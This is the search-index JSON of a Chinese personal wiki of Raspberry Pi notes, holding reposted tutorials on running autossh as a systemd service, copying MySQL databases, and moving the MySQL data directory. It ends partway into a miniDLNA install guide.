{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5fae\u7ad9 \u6b22\u8fce\u4f7f\u7528\u5fae\u7ad9,\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6 \u6811\u8393\u6d3e \u5916\u7f51\u7aef\u53e3 BT\u4e0b\u8f7d DDNS\u670d\u52a1 Samba ... Bash \u6587\u4ef6\u7ba1\u7406 # ls cat mkdir rmdir ... \u6743\u9650\u7ba1\u7406\u3000 # chown chmod passwd ... \u5b57\u7b26\u5904\u7406/ grep sed awk ... # \u5176\u5b83\u7c7b\u578b C/C++ * \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5 Java * \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5 Python * \u722c\u866b * Sagemath * \u7070\u5e3d\u5b50 \u7b97\u6cd5 * \u5206\u6cbb * \u52a8\u6001\u89c4\u5212 * \u56fe\u7684\u641c\u7d22 * \u80cc\u5305 * \u7ec4\u5408\u6570\u5b66 \u6c47\u7f16 * \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"\u5fae\u7ad9"},{"location":"#_1","text":"\u6b22\u8fce\u4f7f\u7528\u5fae\u7ad9,\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6","title":"\u5fae\u7ad9"},{"location":"#_2","text":"\u5916\u7f51\u7aef\u53e3 BT\u4e0b\u8f7d DDNS\u670d\u52a1 Samba ...","title":"\u6811\u8393\u6d3e"},{"location":"#bash","text":"\u6587\u4ef6\u7ba1\u7406 # ls cat mkdir rmdir ... \u6743\u9650\u7ba1\u7406\u3000 # chown chmod passwd ... \u5b57\u7b26\u5904\u7406/ grep sed awk ... # \u5176\u5b83\u7c7b\u578b","title":"Bash"},{"location":"#cc","text":"* \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"C/C++"},{"location":"#java","text":"* \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"Java"},{"location":"#python","text":"* \u722c\u866b * Sagemath * \u7070\u5e3d\u5b50","title":"Python"},{"location":"#_3","text":"* \u5206\u6cbb * \u52a8\u6001\u89c4\u5212 * \u56fe\u7684\u641c\u7d22 * \u80cc\u5305 * \u7ec4\u5408\u6570\u5b66","title":"\u7b97\u6cd5"},{"location":"#_4","text":"* \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"\u6c47\u7f16"},{"location":"about/","text":"\u5173\u4e8e \u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6","title":"\u5173\u4e8e"},{"location":"about/#_1","text":"\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6","title":"\u5173\u4e8e"},{"location":"Bash/","text":"","title":"Bash"},{"location":"Python/","text":"","title":"Python"},{"location":"RPI/Autossh%20and%20Systemd%20Service/","text":"Autossh and Systemd Service Several months ago, I wrote a post to describe how to setup an autossh daemon with upstart . Since Ubuntu 15.04 has switched to systemd , I would like to do the same with systemd . I will give a brief introduction to systemd in this post. Systemd Unit File Systemd services are configured by unit files . By convention, these files use .service as their file name extension. On Ubuntu, there are two directories for unit files : /lib/systemd -- This is the directory for unit files provided by the installed packages. /etc/systemd -- This is the directory for the administrators to create, override, modify or mask the unit files in /lib/systemd . Although the autossh package does not come with any unit file, we can create one in /lib/systemd : $ sudo vim /lib/systemd/system/autossh.service Here's the content of the unit file: [Unit] Description=autossh Wants=network-online.target After=network-online.target [Service] Type=simple User=autossh EnvironmentFile=/etc/default/autossh ExecStart= ExecStart=/usr/bin/autossh $SSH_OPTIONS Restart=always RestartSec=60 [Install] WantedBy=multi-user.target Some explanations to the options: Description= contains some words that can describe the service. This will show up in the logs. Wants= specifies the dependencies of the services. If this service is activated, systemd will also activate the listed services. In our case, we would like to make sure that the network interface is ready, thus we specified network-online.target [1] . * After= specifies the order to launch the service. With the After option, systemd will only launch the service after the activation of listed services. Notice that this option is orthogonal to Wants (or Requires .) If After is not specified, systemd may launch the dependencies simultaneously. * Type= specifies the type of the service. There are several options: simple, fork, oneshot, and etc. + A **simple** service will contain one long running process. The process will not stop unless we kill the service. + A **fork** service means that the `ExecStart` command will fork a subprocess and return immediately. In the other words, the command will manage the process by themselves. + An **oneshot** service will launch a new process whenever an event triggers this service. User= specifies the user as whom the service process is run. By default, the process is run as root . EnvironmentFile= specifies the path to an environment file, which contains the environment variables for the service process. ExecStart= specifies the command to launch the service. We have to specify the full path to the executable to be executed. Notice that there are two ExecStart in our unit file. They are not typos. In order to allow this unit file to be included by another unit file, we have to clear ExecStart before specifying a new command. * WantedBy= specifies the init stage to launch the service (if the service is enabled.) Now, we can create a soft link in /etc/systemd/system : $ sudo ln -s /lib/systemd/system/autossh.service \\ /etc/systemd/system/autossh.service Environment File Did you notice that there is a variable $SSH_OPTIONS in the ExecStart option above? It will be substituted by the environment variable from the file specified by EnvironmentFile . Environment files are the files which contain the configurations which should be passed to the service. Let's create an environment file: $ sudo vim /etc/default/autossh The environment file resembles to a Bash script. Here's the example for our autossh service: AUTOSSH_POLL=60 AUTOSSH_FIRST_POLL=30 AUTOSSH_GATETIME=0 AUTOSSH_PORT=22000 SSH_OPTIONS=\"-N -R 2222:localhost:22 example.com -i /home/autossh/.ssh/id_rsa\" We can find more options by reading autossh man pages. Start the Service Before we can start our service, we have to ask systemd to reload all unit files: $ sudo systemctl daemon-reload Now, we can start autossh service with: $ sudo systemctl start autossh And then, we can check the status with: $ sudo systemctl status autossh With this command, you should be able to see the following output (if the unit file is correct): * autossh.service - autossh Loaded: loaded (/lib/systemd/system/autossh.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2015-11-15 22:51:25 CST; 1min 1s ago Main PID: 14382 (autossh) CGroup: /system.slice/autossh.service |-14382 /usr/lib/autossh/autossh -N -R 8022:localhost:22 .... `-14385 /usr/bin/ssh -L ... If there are some problems, check /var/log/syslog for more details. BTW, to stop the service, we can use the following command: $ sudo systemctl stop autossh Launch Service at Boot Time OK. If everything goes well, then we may ask systemd to launch our service during the boot time. To do so, we have to enable the service with: $ sudo systemctl enable autossh Conclusion In this post, I have covered some basic concept of systemd unit files and basic commands to control systemd : Reload unit files with sudo systemctl daemon-reload Start/stop service with: sudo systemctl [start/stop] [name] Check service status with: sudo systemctl status [name] Register/unregister the service for the boot time with: sudo systemctl [enable/disable] [name] Hope you enjoy this article. Reference Wikipedia: systemd Arch Linux wiki: systemd Ubuntu wiki: systemd for upstart users RedHat RHEL7: System Administrator's Guide: Chapter 8 Systemd Manuals : systemd.unit and systemd.service . Running Services After the Network is up | [1] | It is non-trivial to write an unit file for the service that requires network connections, read Running Services After the Network is up for more details. | \u539f\u6587\u94fe\u63a5\uff1a http://logan.tw/posts/2015/11/15/autossh-and-systemd-service/","title":"Autossh and Systemd Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#autossh-and-systemd-service","text":"Several months ago, I wrote a post to describe how to setup an autossh daemon with upstart . Since Ubuntu 15.04 has switched to systemd , I would like to do the same with systemd . I will give a brief introduction to systemd in this post.","title":"Autossh and Systemd Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#systemd-unit-file","text":"Systemd services are configured by unit files . By convention, these files use .service as their file name extension. On Ubuntu, there are two directories for unit files : /lib/systemd -- This is the directory for unit files provided by the installed packages. /etc/systemd -- This is the directory for the administrators to create, override, modify or mask the unit files in /lib/systemd . Although the autossh package does not come with any unit file, we can create one in /lib/systemd : $ sudo vim /lib/systemd/system/autossh.service Here's the content of the unit file: [Unit] Description=autossh Wants=network-online.target After=network-online.target [Service] Type=simple User=autossh EnvironmentFile=/etc/default/autossh ExecStart= ExecStart=/usr/bin/autossh $SSH_OPTIONS Restart=always RestartSec=60 [Install] WantedBy=multi-user.target Some explanations to the options: Description= contains some words that can describe the service. This will show up in the logs. Wants= specifies the dependencies of the services. If this service is activated, systemd will also activate the listed services. In our case, we would like to make sure that the network interface is ready, thus we specified network-online.target [1] . * After= specifies the order to launch the service. With the After option, systemd will only launch the service after the activation of listed services. Notice that this option is orthogonal to Wants (or Requires .) If After is not specified, systemd may launch the dependencies simultaneously. * Type= specifies the type of the service. There are several options: simple, fork, oneshot, and etc. + A **simple** service will contain one long running process. The process will not stop unless we kill the service. + A **fork** service means that the `ExecStart` command will fork a subprocess and return immediately. In the other words, the command will manage the process by themselves. + An **oneshot** service will launch a new process whenever an event triggers this service. User= specifies the user as whom the service process is run. By default, the process is run as root . EnvironmentFile= specifies the path to an environment file, which contains the environment variables for the service process. ExecStart= specifies the command to launch the service. We have to specify the full path to the executable to be executed. Notice that there are two ExecStart in our unit file. They are not typos. In order to allow this unit file to be included by another unit file, we have to clear ExecStart before specifying a new command. * WantedBy= specifies the init stage to launch the service (if the service is enabled.) Now, we can create a soft link in /etc/systemd/system : $ sudo ln -s /lib/systemd/system/autossh.service \\ /etc/systemd/system/autossh.service","title":"Systemd Unit File"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#environment-file","text":"Did you notice that there is a variable $SSH_OPTIONS in the ExecStart option above? It will be substituted by the environment variable from the file specified by EnvironmentFile . Environment files are the files which contain the configurations which should be passed to the service. Let's create an environment file: $ sudo vim /etc/default/autossh The environment file resembles to a Bash script. Here's the example for our autossh service: AUTOSSH_POLL=60 AUTOSSH_FIRST_POLL=30 AUTOSSH_GATETIME=0 AUTOSSH_PORT=22000 SSH_OPTIONS=\"-N -R 2222:localhost:22 example.com -i /home/autossh/.ssh/id_rsa\" We can find more options by reading autossh man pages.","title":"Environment File"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#start-the-service","text":"Before we can start our service, we have to ask systemd to reload all unit files: $ sudo systemctl daemon-reload Now, we can start autossh service with: $ sudo systemctl start autossh And then, we can check the status with: $ sudo systemctl status autossh With this command, you should be able to see the following output (if the unit file is correct): * autossh.service - autossh Loaded: loaded (/lib/systemd/system/autossh.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2015-11-15 22:51:25 CST; 1min 1s ago Main PID: 14382 (autossh) CGroup: /system.slice/autossh.service |-14382 /usr/lib/autossh/autossh -N -R 8022:localhost:22 .... `-14385 /usr/bin/ssh -L ... If there are some problems, check /var/log/syslog for more details. BTW, to stop the service, we can use the following command: $ sudo systemctl stop autossh","title":"Start the Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#launch-service-at-boot-time","text":"OK. If everything goes well, then we may ask systemd to launch our service during the boot time. To do so, we have to enable the service with: $ sudo systemctl enable autossh","title":"Launch Service at Boot Time"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#conclusion","text":"In this post, I have covered some basic concept of systemd unit files and basic commands to control systemd : Reload unit files with sudo systemctl daemon-reload Start/stop service with: sudo systemctl [start/stop] [name] Check service status with: sudo systemctl status [name] Register/unregister the service for the boot time with: sudo systemctl [enable/disable] [name] Hope you enjoy this article.","title":"Conclusion"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#reference","text":"Wikipedia: systemd Arch Linux wiki: systemd Ubuntu wiki: systemd for upstart users RedHat RHEL7: System Administrator's Guide: Chapter 8 Systemd Manuals : systemd.unit and systemd.service . Running Services After the Network is up | [1] | It is non-trivial to write an unit file for the service that requires network connections, read Running Services After the Network is up for more details. | \u539f\u6587\u94fe\u63a5\uff1a http://logan.tw/posts/2015/11/15/autossh-and-systemd-service/","title":"Reference"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/","text":"Copying MySQL Databases to Another Machine 2.11.13 Copying MySQL Databases to Another Machine In cases where you need to transfer databases between different architectures, you can use mysqldump to create a file containing SQL statements. You can then transfer the file to the other machine and feed it as input to the mysql client. Use mysqldump --help to see what options are available. The easiest (although not the fastest) way to move a database between two machines is to run the following commands on the machine on which the database is located: mysqladmin -h '*other_hostname*' create *db_name* mysqldump *db_name* | mysql -h '*other_hostname*' *db_name* If you want to copy a database from a remote machine over a slow network, you can use these commands: mysqladmin create *db_name* mysqldump -h '*other_hostname*' --compress *db_name* | mysql *db_name* You can also store the dump in a file, transfer the file to the target machine, and then load the file into the database there. For example, you can dump a database to a compressed file on the source machine like this: mysqldump --quick *db_name* | gzip > *db_name*.gz Transfer the file containing the database contents to the target machine and run these commands there: mysqladmin create *db_name* gunzip < *db_name*.gz | mysql *db_name* You can also use mysqldump and mysqlimport to transfer the database. For large tables, this is much faster than simply using mysqldump . In the following commands, DUMPDIR represents the full path name of the directory you use to store the output from mysqldump . First, create the directory for the output files and dump the database: mkdir *DUMPDIR* mysqldump --tab=*DUMPDIR* *db_name* Then transfer the files in the DUMPDIR directory to some corresponding directory on the target machine and load the files into MySQL there: mysqladmin create *db_name* # create database cat *DUMPDIR*/*.sql | mysql *db_name* # create tables in database mysqlimport *db_name* *DUMPDIR*/*.txt # load data into tables Do not forget to copy the mysql database because that is where the grant tables are stored. You might have to run commands as the MySQL root user on the new machine until you have the mysql database in place. After you import the mysql database on the new machine, execute mysqladmin flush-privileges so that the server reloads the grant table information. Note You can copy the .frm , .MYI , and .MYD files for MyISAM tables between different architectures that support the same floating-point format. (MySQL takes care of any byte-swapping issues.) See Section 15.2, \u201cThe MyISAM Storage Engine\u201d . \u539f\u6587\u94fe\u63a5\uff1a https://dev.mysql.com/doc/refman/5.7/en/copying-databases.html","title":"Copying MySQL Databases to Another Machine"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/#copying-mysql-databases-to-another-machine","text":"","title":"Copying MySQL Databases to Another Machine"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/#21113-copying-mysql-databases-to-another-machine","text":"In cases where you need to transfer databases between different architectures, you can use mysqldump to create a file containing SQL statements. You can then transfer the file to the other machine and feed it as input to the mysql client. Use mysqldump --help to see what options are available. The easiest (although not the fastest) way to move a database between two machines is to run the following commands on the machine on which the database is located: mysqladmin -h '*other_hostname*' create *db_name* mysqldump *db_name* | mysql -h '*other_hostname*' *db_name* If you want to copy a database from a remote machine over a slow network, you can use these commands: mysqladmin create *db_name* mysqldump -h '*other_hostname*' --compress *db_name* | mysql *db_name* You can also store the dump in a file, transfer the file to the target machine, and then load the file into the database there. For example, you can dump a database to a compressed file on the source machine like this: mysqldump --quick *db_name* | gzip > *db_name*.gz Transfer the file containing the database contents to the target machine and run these commands there: mysqladmin create *db_name* gunzip < *db_name*.gz | mysql *db_name* You can also use mysqldump and mysqlimport to transfer the database. For large tables, this is much faster than simply using mysqldump . In the following commands, DUMPDIR represents the full path name of the directory you use to store the output from mysqldump . First, create the directory for the output files and dump the database: mkdir *DUMPDIR* mysqldump --tab=*DUMPDIR* *db_name* Then transfer the files in the DUMPDIR directory to some corresponding directory on the target machine and load the files into MySQL there: mysqladmin create *db_name* # create database cat *DUMPDIR*/*.sql | mysql *db_name* # create tables in database mysqlimport *db_name* *DUMPDIR*/*.txt # load data into tables Do not forget to copy the mysql database because that is where the grant tables are stored. You might have to run commands as the MySQL root user on the new machine until you have the mysql database in place. After you import the mysql database on the new machine, execute mysqladmin flush-privileges so that the server reloads the grant table information. Note You can copy the .frm , .MYI , and .MYD files for MyISAM tables between different architectures that support the same floating-point format. (MySQL takes care of any byte-swapping issues.) See Section 15.2, \u201cThe MyISAM Storage Engine\u201d . \u539f\u6587\u94fe\u63a5\uff1a https://dev.mysql.com/doc/refman/5.7/en/copying-databases.html","title":"2.11.13\u00a0Copying MySQL Databases to Another Machine"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/","text":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 | DigitalOcean DigitalOcean Homepage ### Introduction Databases grow over time, sometimes outgrowing the space on the file system. You can also run into I/O contention when they\u2019re located on the same partition as the rest of the operating system. RAID, network block storage, and other devices can offer redundancy and other desirable features. Whether you\u2019re adding more space, evaluating ways to optimize performance, or looking to take advantage of other storage features, this tutorial will guide you through relocating MySQL\u2019s data directory. Prerequisites To complete this guide, you will need: An Ubuntu 16.04 server with a non-root user with sudo privileges . You can learn more about how to set up a user with these privileges in our Initial Server Setup with Ubuntu 16.04 guide. A MySQL server . If you haven\u2019t already installed MySQL, the How To Install MySQL on Ubuntu 16.04 guide can help you. In this example, we\u2019re moving the data to a block storage device mounted at /mnt/volume-nyc1-01 . You can learn how to set one up in the How To Use Block Storage on DigitalOcean guide. No matter what underlying storage you use, this guide can help you move the data directory to a new location. Step 1 \u2014 Moving the MySQL Data Directory To prepare for moving MySQL\u2019s data directory, let\u2019s verify the current location by starting an interactive MySQL session using the administrative credentials. 1. mysql -u root -p When prompted, supply the MySQL root password. Then from the MySQL prompt, select the data directory: 1. select @@datadir; Output+-----------------+ | @@datadir | +-----------------+ | /var/lib/mysql/ | +-----------------+ 1 row in set (0.00 sec) This output confirms that MySQL is configured to use the default data directory, /var/lib/mysql/, so that\u2019s the directory we need to move. Once you\u2019ve confirmed this, type exit to leave the monitor. To ensure the integrity of the data, we\u2019ll shut down MySQL before we actually make changes to the data directory: 1. sudo systemctl stop mysql systemctl doesn\u2019t display the outcome of all service management commands, so if you want to be sure you\u2019ve succeeded, use the following command: 1. sudo systemctl status mysql You can be sure it\u2019s shut down if the final line of the output tells you the server is stopped: Output. . . Jul 18 11:24:20 ubuntu-512mb-nyc1-01 systemd[1]: Stopped MySQL Community Server. Now that the server is shut down, we\u2019ll copy the existing database directory to the new location with rsync . Using the -a flag preserves the permissions and other directory properties, while -v provides verbose output so you can follow the progress. Note: Be sure there is no trailing slash on the directory, which may be added if you use tab completion. When there\u2019s a trailing slash, rsync will dump the contents of the directory into the mount point instead of transferring it into a containing mysql directory: 1. sudo rsync -av /var/lib/mysql /mnt/volume-nyc1-01 Once the rsync is complete, rename the current folder with a .bak extension and keep it until we\u2019ve confirmed the move was successful. By re-naming it, we\u2019ll avoid confusion that could arise from files in both the new and the old location: 1. sudo mv /var/lib/mysql /var/lib/mysql.bak Now we\u2019re ready to turn our attention to configuration. Step 2 \u2014 Pointing to the New Data Location MySQL has several ways to override configuration values. By default, the datadir is set to /var/lib/mysql in the /etc/mysql/mysql.conf.d/mysqld.cnf file. Edit this file to reflect the new data directory: 1. sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf Find the line that begins with datadir= and change the path which follows to reflect the new location. In our case, the updated file looks like the output below: /etc/mysql/mysql.conf.d/mysqld.cnf . . . datadir=/mnt/volume-nyc1-01/mysql . . . This seems like the right time to bring up MySQL again, but there\u2019s one more thing to configure before we can do that successfully. Step 3 \u2014 Configuring AppArmor Access Control Rules We\u2019ll need to tell AppArmor to let MySQL write to the new directory by creating an alias between the default directory and the new location. To do this, edit the AppArmor alias file: 1. sudo nano /etc/apparmor.d/tunables/alias At the bottom of the file, add the following alias rule: . . . [label /etc/apparmor.d/tunables/alias] alias /var/lib/mysql/ -> /mnt/volume-nyc1-01/mysql/, . . . For the changes to take effect, restart AppArmor: 1. sudo systemctl restart apparmor Note: If you skipped the AppArmor configuration step, you would run into the following error message: OutputJob for mysql.service failed because the control process exited with error code. See \"systemctl status mysql.service\" and \"journalctl -xe\" for details. The output from both systemctl and journalctl concludes with: OutputJul 18 11:03:24 ubuntu-512mb-nyc1-01 systemd[1]: mysql.service: Main process exited, code=exited, status=1/FAILURE Since the messages don\u2019t make an explicit connection between AppArmor and the data directory, this error can take some time to figure out. Step 4 \u2014 Restarting MySQL The next step is to start MySQL, but if you do, you\u2019ll run into another error. This time, instead of an AppArmor issue, the error happens because the script mysql-systemd-start checks for the existence of either a directory, -d , or a symbolic link, -L , that matches two default paths. It fails if they\u2019re not found: /usr/share/mysql/mysql-systemd-start . . . if [ ! -d /var/lib/mysql ] && [ ! -L /var/lib/mysql ]; then echo \"MySQL data dir not found at /var/lib/mysql. Please create one.\" exit 1 fi if [ ! -d /var/lib/mysql/mysql ] && [ ! -L /var/lib/mysql/mysql ]; then echo \"MySQL system database not found. Please run mysql_install_db tool.\" exit 1 fi . . . Since we need these to start the server, we will create the minimal directory structure to pass the script\u2019s environment check. 1. sudo mkdir /var/lib/mysql/mysql -p Now we\u2019re ready to start MySQL. 1. sudo systemctl start mysql 2. sudo systemctl status mysql To make sure that the new data directory is indeed in use, start the MySQL monitor. 1. mysql -u root -p Look at the value for the data directory again: Output+----------------------------+ | @@datadir | +----------------------------+ | /mnt/volume-nyc1-01/mysql/ | +----------------------------+ 1 row in set (0.01 sec) Now that you\u2019ve restarted MySQL and confirmed that it\u2019s using the new location, take the opportunity to ensure that your database is fully functional. Once you\u2019ve verified the integrity of any existing data, you can remove the backup data directory: 1. sudo rm -Rf /var/lib/mysql.bak Restart MySQL one final time to be sure that it works as expected: 1. sudo systemctl restart mysql 2. sudo systemctl status mysql Conclusion In this tutorial, we\u2019ve moved MySQL\u2019s data directory to a new location and updated Ubuntu\u2019s AppArmor ACLs to accommodate the adjustment. Although we were using a Block Storage device, the instructions here should be suitable for redefining the location of the data directory regardless of the underlying technology. For more on managing MySQL\u2019s data directories, see these sections in the official MySQL documentation: The Mysql Data Directory Setting Up Multiple Data Directories \u539f\u6587\u94fe\u63a5\uff1a https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-16-04","title":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-1604-digitalocean-digitalocean-homepage","text":"### Introduction Databases grow over time, sometimes outgrowing the space on the file system. You can also run into I/O contention when they\u2019re located on the same partition as the rest of the operating system. RAID, network block storage, and other devices can offer redundancy and other desirable features. Whether you\u2019re adding more space, evaluating ways to optimize performance, or looking to take advantage of other storage features, this tutorial will guide you through relocating MySQL\u2019s data directory.","title":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 | DigitalOcean DigitalOcean Homepage"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#prerequisites","text":"To complete this guide, you will need: An Ubuntu 16.04 server with a non-root user with sudo privileges . You can learn more about how to set up a user with these privileges in our Initial Server Setup with Ubuntu 16.04 guide. A MySQL server . If you haven\u2019t already installed MySQL, the How To Install MySQL on Ubuntu 16.04 guide can help you. In this example, we\u2019re moving the data to a block storage device mounted at /mnt/volume-nyc1-01 . You can learn how to set one up in the How To Use Block Storage on DigitalOcean guide. No matter what underlying storage you use, this guide can help you move the data directory to a new location.","title":"Prerequisites"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-1-moving-the-mysql-data-directory","text":"To prepare for moving MySQL\u2019s data directory, let\u2019s verify the current location by starting an interactive MySQL session using the administrative credentials. 1. mysql -u root -p When prompted, supply the MySQL root password. Then from the MySQL prompt, select the data directory: 1. select @@datadir; Output+-----------------+ | @@datadir | +-----------------+ | /var/lib/mysql/ | +-----------------+ 1 row in set (0.00 sec) This output confirms that MySQL is configured to use the default data directory, /var/lib/mysql/, so that\u2019s the directory we need to move. Once you\u2019ve confirmed this, type exit to leave the monitor. To ensure the integrity of the data, we\u2019ll shut down MySQL before we actually make changes to the data directory: 1. sudo systemctl stop mysql systemctl doesn\u2019t display the outcome of all service management commands, so if you want to be sure you\u2019ve succeeded, use the following command: 1. sudo systemctl status mysql You can be sure it\u2019s shut down if the final line of the output tells you the server is stopped: Output. . . Jul 18 11:24:20 ubuntu-512mb-nyc1-01 systemd[1]: Stopped MySQL Community Server. Now that the server is shut down, we\u2019ll copy the existing database directory to the new location with rsync . Using the -a flag preserves the permissions and other directory properties, while -v provides verbose output so you can follow the progress. Note: Be sure there is no trailing slash on the directory, which may be added if you use tab completion. When there\u2019s a trailing slash, rsync will dump the contents of the directory into the mount point instead of transferring it into a containing mysql directory: 1. sudo rsync -av /var/lib/mysql /mnt/volume-nyc1-01 Once the rsync is complete, rename the current folder with a .bak extension and keep it until we\u2019ve confirmed the move was successful. By re-naming it, we\u2019ll avoid confusion that could arise from files in both the new and the old location: 1. sudo mv /var/lib/mysql /var/lib/mysql.bak Now we\u2019re ready to turn our attention to configuration.","title":"Step 1 \u2014 Moving the MySQL Data Directory"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-2-pointing-to-the-new-data-location","text":"MySQL has several ways to override configuration values. By default, the datadir is set to /var/lib/mysql in the /etc/mysql/mysql.conf.d/mysqld.cnf file. Edit this file to reflect the new data directory: 1. sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf Find the line that begins with datadir= and change the path which follows to reflect the new location. In our case, the updated file looks like the output below: /etc/mysql/mysql.conf.d/mysqld.cnf . . . datadir=/mnt/volume-nyc1-01/mysql . . . This seems like the right time to bring up MySQL again, but there\u2019s one more thing to configure before we can do that successfully.","title":"Step 2 \u2014 Pointing to the New Data Location"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-3-configuring-apparmor-access-control-rules","text":"We\u2019ll need to tell AppArmor to let MySQL write to the new directory by creating an alias between the default directory and the new location. To do this, edit the AppArmor alias file: 1. sudo nano /etc/apparmor.d/tunables/alias At the bottom of the file, add the following alias rule: . . . [label /etc/apparmor.d/tunables/alias] alias /var/lib/mysql/ -> /mnt/volume-nyc1-01/mysql/, . . . For the changes to take effect, restart AppArmor: 1. sudo systemctl restart apparmor Note: If you skipped the AppArmor configuration step, you would run into the following error message: OutputJob for mysql.service failed because the control process exited with error code. See \"systemctl status mysql.service\" and \"journalctl -xe\" for details. The output from both systemctl and journalctl concludes with: OutputJul 18 11:03:24 ubuntu-512mb-nyc1-01 systemd[1]: mysql.service: Main process exited, code=exited, status=1/FAILURE Since the messages don\u2019t make an explicit connection between AppArmor and the data directory, this error can take some time to figure out.","title":"Step 3 \u2014 Configuring AppArmor Access Control Rules"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-4-restarting-mysql","text":"The next step is to start MySQL, but if you do, you\u2019ll run into another error. This time, instead of an AppArmor issue, the error happens because the script mysql-systemd-start checks for the existence of either a directory, -d , or a symbolic link, -L , that matches two default paths. It fails if they\u2019re not found: /usr/share/mysql/mysql-systemd-start . . . if [ ! -d /var/lib/mysql ] && [ ! -L /var/lib/mysql ]; then echo \"MySQL data dir not found at /var/lib/mysql. Please create one.\" exit 1 fi if [ ! -d /var/lib/mysql/mysql ] && [ ! -L /var/lib/mysql/mysql ]; then echo \"MySQL system database not found. Please run mysql_install_db tool.\" exit 1 fi . . . Since we need these to start the server, we will create the minimal directory structure to pass the script\u2019s environment check. 1. sudo mkdir /var/lib/mysql/mysql -p Now we\u2019re ready to start MySQL. 1. sudo systemctl start mysql 2. sudo systemctl status mysql To make sure that the new data directory is indeed in use, start the MySQL monitor. 1. mysql -u root -p Look at the value for the data directory again: Output+----------------------------+ | @@datadir | +----------------------------+ | /mnt/volume-nyc1-01/mysql/ | +----------------------------+ 1 row in set (0.01 sec) Now that you\u2019ve restarted MySQL and confirmed that it\u2019s using the new location, take the opportunity to ensure that your database is fully functional. Once you\u2019ve verified the integrity of any existing data, you can remove the backup data directory: 1. sudo rm -Rf /var/lib/mysql.bak Restart MySQL one final time to be sure that it works as expected: 1. sudo systemctl restart mysql 2. sudo systemctl status mysql","title":"Step 4 \u2014 Restarting MySQL"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#conclusion","text":"In this tutorial, we\u2019ve moved MySQL\u2019s data directory to a new location and updated Ubuntu\u2019s AppArmor ACLs to accommodate the adjustment. Although we were using a Block Storage device, the instructions here should be suitable for redefining the location of the data directory regardless of the underlying technology. For more on managing MySQL\u2019s data directories, see these sections in the official MySQL documentation: The Mysql Data Directory Setting Up Multiple Data Directories \u539f\u6587\u94fe\u63a5\uff1a https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-16-04","title":"Conclusion"},{"location":"RPI/Install%20Latest%20ReadyMedia%20miniDLNA%20Raspberry%20Pi/","text":"DLNA servers allow you to stream your media library on your HTPC server to any DLNA enabled client. DLNA enabled clients include Bluray players, XBOX 360, XBOX One, PS3, PS4 and some TVs. There are other DLNA servers out there for the Raspberry Pi. I was looking at MediaTomb but it consumes several hundred megabytes of RAM when it is in use. This it not ideal on the low spec Pi running Raspbian. I had trouble with miniDLNA 1.0.24 not displaying avi (Divx, XviD) files in its folder database, this bug has been patched and fixed so that avi files \u2013 at least the ones I tested \u2013 were accessible by my DLNA clients. I will assume you have already mounted a USB hard drive for this guide \u2013 here is my Properly Mount USB Storage on Raspberry Guide in case you do need to mount. You will be compiling miniDLNA for Raspbian from source, it only takes a few minutes. If you are trying to figure out which hardware would work best for you, consider reading the Pi benchmarks . Update \u2013 Now installs the latest miniDLNA The latest version of ReadyMedia miniDLNA in the Raspbian repos is ancient so we are going to compile miniDLNA (now ReadyMedia) from source on Raspbian. This should fix avi problems you may have had in the past like them not showing up in the library. Remove your old miniDLNA version sudo apt-get purge minidlna -y sudo apt-get remove 